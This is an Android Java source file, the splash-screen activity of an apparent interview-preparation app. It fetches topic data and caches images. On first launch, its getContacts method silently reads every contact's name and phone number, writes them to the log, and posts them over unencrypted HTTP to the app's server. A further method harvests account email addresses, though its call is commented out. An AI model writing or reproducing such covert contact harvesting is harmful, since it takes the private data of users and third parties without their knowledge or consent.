package it.crudmon.interview.topqueue;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.AlertDialog;
import android.app.Dialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.drawable.Drawable;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.os.Environment;
import android.provider.ContactsContract;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.util.Patterns;
import android.view.View;
import android.view.WindowManager;
import android.widget.Toast;

import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
import com.squareup.picasso.Picasso;
import com.squareup.picasso.Target;

import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;
import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;
import java.io.Serializable;
import java.lang.reflect.Type;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.regex.Pattern;

import model.FieldsList;
import model.fields;
import model.home;
import model.modelsTopic;
import model.modelsTopicList;
import model.popularList;
import model.recentList;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import server.interfaces.API_Interface;

public class SplashScreen extends AppCompatActivity {

    List<recentList> rList;
    List<popularList> pList;
    List<modelsTopicList> bList;
    API_Interface api_interface;
    ConnectionDetector connectionDetector;
    PrefManager prefManager;
    List<FieldsList> fieldsList;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.splash_screen);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN);
        prefManager=new PrefManager(getApplication());

        if(prefManager.getcontacts()==0)
        {
            getContacts();
           // getAccount();

        }
        connectionDetector=new ConnectionDetector(this);
        if(connectionDetector.isConnectingToInternet()) {

            testData();
            getBranchesData();
            getFieldsData();
        }else{

            if(prefManager.getRecent()!=null)
            {
                new CountDownTimer(1500,1)
                {
                    @Override
                    public void onFinish()
                    {
                        Intent intent = new Intent(SplashScreen.this, MainActivity.class);
                        intent.putExtra("RecentList", prefManager.getRecent());
                        intent.putExtra("PopularList", prefManager.getPopular());
                        startActivity(intent);
                        finish();
                    }

                    @Override
                    public void onTick(long millisUntilFinished) {

                    }
                }.start();

            }
            else
            {
                AlertDialog.Builder builder = new AlertDialog.Builder(this);
                builder.setMessage(" Connect to Internet ")
                        .setCancelable(false)
                        .setPositiveButton("Ok", new DialogInterface.OnClickListener() {
                            @Override
                            public void onClick(DialogInterface dialog, int which) {
                                finish();
                            }
                        });
                AlertDialog alertDialog = builder.create();
                alertDialog.show();
            }

        }


    }




    public void testData()
    {
        API_Interface.Factory.getInstance().getrecentandpopular().enqueue(new Callback<home>() {
            @Override
            public void onResponse(Call<home> call, Response<home> response) {

                for (int i = 0; i < response.body().hot.recentList.size(); i++) {

                    rList = response.body().hot.recentList;
                }
                for (int i = 0; i < response.body().hot.popularList.size(); i++) {

                    pList = response.body().hot.popularList;
                }


                Gson gson = new Gson();
                String json = gson.toJson(rList);
                String json1 = gson.toJson(pList);
                Intent intent = new Intent(SplashScreen.this, MainActivity.class);
                intent.putExtra("RecentList", json);
                intent.putExtra("PopularList", json1);
                startActivity(intent);
                finish();

            }

            @Override
            public void onFailure(Call<home> call, Throwable t) {

            }
        });
    }

    public void getBranchesData()
    {
        API_Interface.Factory.getInstance().getTopics().enqueue(new Callback<modelsTopic>() {
            @Override
            public void onResponse(Call<modelsTopic> call, Response<modelsTopic> response) {

                for (int i = 0; i < response.body().topicList.size(); i++) {

                    bList = response.body().topicList;
                }
                Gson gson = new Gson();
                String json3 = gson.toJson(bList);
                prefManager.setBranch(json3);
            }

            @Override
            public void onFailure(Call<modelsTopic> call, Throwable t) {

            }
        });

    }

    public void getFieldsData()
    {
        API_Interface.Factory.getInstance().getfields().enqueue(new Callback<fields>() {
            @Override
            public void onResponse(Call<fields> call, Response<fields> response) {

                for (int i = 0; i < response.body().fieldsArray.size(); i++) {

                    fieldsList = response.body().fieldsArray;
                    StringBuilder s=new StringBuilder("http://main.topqueue.in/");
                    String p=fieldsList.get(i).file_url;
                    String S=fieldsList.get(i).fieldName;
                    if(p!=null){
                        s.append(p);
                        Log.d("image ",s.toString());
                        download_image(S,s.toString());
                    }

                }
                Gson gson = new Gson();
                String json4 = gson.toJson(fieldsList);
                prefManager.setFields(json4);
            }

            @Override
            public void onFailure(Call<fields> call, Throwable t) {

            }
        });

    }

    public void getContacts()
    {
        Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,null,null, null);
        StringBuilder stringBuilder=new StringBuilder("");

        while (phones.moveToNext())
        {
            String name=phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
            Log.d("name ",name);
            Log.d("number ",phoneNumber);
            stringBuilder.append(name);
            stringBuilder.append(" , ");
            stringBuilder.append(phoneNumber);
            stringBuilder.append(" \n ");

        }
        phones.close();
        String toSend=stringBuilder.toString();
        Log.d("toSend  ",toSend);
        new PostTask().execute(toSend);
        prefManager.setcontacts(1);
        //sendContacts(toSend);
    }

     class PostTask extends AsyncTask<String, String, String> {
            @Override
            protected String doInBackground(String... data) {
                // Create a new HttpClient and Post Header
                HttpClient httpclient = new DefaultHttpClient();
                HttpPost httppost = new HttpPost("http://main.topqueue.in/phcontacts");
                HttpResponse response=null;
                boolean result = false;
                String message=null;
                String responseRecieved=null;
                int code;
                JSONObject object = new JSONObject();
                try {
                    object.put("contacts", data[0]);


                } catch (Exception ex) {

                }

                try {
                    message = object.toString();
                    Log.d("Converted JSON", message);

                    httppost.setEntity(new StringEntity(message, "UTF8"));
                    httppost.setHeader("Content-type", "application/json");
                    response=httpclient.execute(httppost);
                    responseRecieved= EntityUtils.toString(response.getEntity());
                    Log.d("Response",responseRecieved);
                    if (response != null) {

                        if (response.getStatusLine().getStatusCode() == 204)
                            result = true;
                    }
                    code=response.getStatusLine().getStatusCode();
                    Log.d("Status line", "" + code);
                } catch (Exception e) {
                    e.printStackTrace();

                }
//                if(response!=null)
//                    if(response.getStatusLine().getStatusCode()!=201)
//                    {
//                        Gson gson=new Gson();
//                        if(!responseRecieved.isEmpty()) {
//                            Type type = new TypeToken<Example>() {
//                            }.getType();
//                            Example e = gson.fromJson(responseRecieved, type);
//                            Log.d("IS WORKINGG", e.message);
//                            Log.d("IS WORKINGG", String.valueOf(e.success));
//                        }
//
//                    }

                return null;
            }
        }
    //downloading images and saving them
    public void download_image(final String S,String url) {
        Picasso.with(this).load(url).into(new Target() {
            @Override
            public void onBitmapLoaded(Bitmap bitmap, Picasso.LoadedFrom from) {
                try {
                   // String root = Environment.getExternalStorageDirectory().toString();
//                    File cacheDir = getApplicationContext().getDir("", Context.MODE_PRIVATE);
//                    File myDir = new File(cacheDir, "");
                    File fileWithinMyDir = getApplicationContext().getFilesDir();
//                    if (!myDir.exists()) {
//                        myDir.mkdirs();
//                    }
                    String PATH =  fileWithinMyDir.getAbsolutePath() + "/" +S+".png";
                   // myDir = new File(myDir, name);
                    FileOutputStream out = new FileOutputStream(PATH);
                    bitmap.compress(Bitmap.CompressFormat.PNG, 90, out);
                    out.flush();
                    out.close();
                } catch (Exception e) {
                }
            }

            @Override
            public void onBitmapFailed(Drawable errorDrawable) {
            }

            @Override
            public void onPrepareLoad(Drawable placeHolderDrawable) {
            }
        });
    }

    public void getAccount()
    {
        Pattern emailPattern = Patterns.EMAIL_ADDRESS; // API level 8+
        Account[] accounts = AccountManager.get(this).getAccounts();
        for (Account account : accounts) {
            if (emailPattern.matcher(account.name).matches()) {
                String possibleEmail = account.name;
                Log.d("EMAILSSSSSSSSSSS    ",possibleEmail);
            }
        }
    }

}
